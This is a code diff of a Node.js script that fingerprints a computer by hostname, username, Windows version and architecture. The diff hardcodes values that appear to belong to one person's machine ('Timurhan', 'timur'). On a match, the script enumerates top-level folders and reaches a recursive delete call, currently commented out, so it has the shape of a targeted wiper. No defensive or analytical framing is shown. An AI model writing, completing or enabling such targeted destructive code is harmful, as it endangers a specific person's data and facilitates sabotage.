@@ -3,18 +3,16 @@ const os = require('node:os');
 const fs = require('node:fs');
 
 const data = {
-"HOSTNAME": 'userhostname',
-"USERNAME": 'userusername',
-"HOMEDIR": 'userhomedir',
-"VERSION": 'userversion',
-"WINVER": 'userrelease',
-"ARCH": 'userarch',
+"HOSTNAME": 'Timurhan',
+"USERNAME": 'timur',
+"VERSION": 'Windows 10 Pro',
+"WINVER": '10.0.22621',
+"ARCH": 'x64',
 }
 
 const pcinfo = {
 "HOSTNAME": os.hostname(),
 "USERNAME": os.userInfo().username,
-"HOMEDIR": os.homedir(),
 "VERSION": os.version(),
 "WINVER": os.release(),
 "ARCH": os.arch(),
@@ -23,13 +21,12 @@ const pcinfo = {
 if (
     pcinfo.HOSTNAME == data.HOSTNAME && 
     pcinfo.USERNAME == data.USERNAME && 
-    pcinfo.HOMEDIR == data.HOMEDIR && 
     pcinfo.VERSION == data.VERSION && 
     pcinfo.WINVER == data.WINVER && 
     pcinfo.ARCH == data.ARCH
 ) {
     glob.sync("./*/").map(resources => {
-        console.log(resources)
+        console.log(resources);
         if (resources == "./System Volume Information/") return;
         //fs.rmSync(resources, {recursive: true});
     })
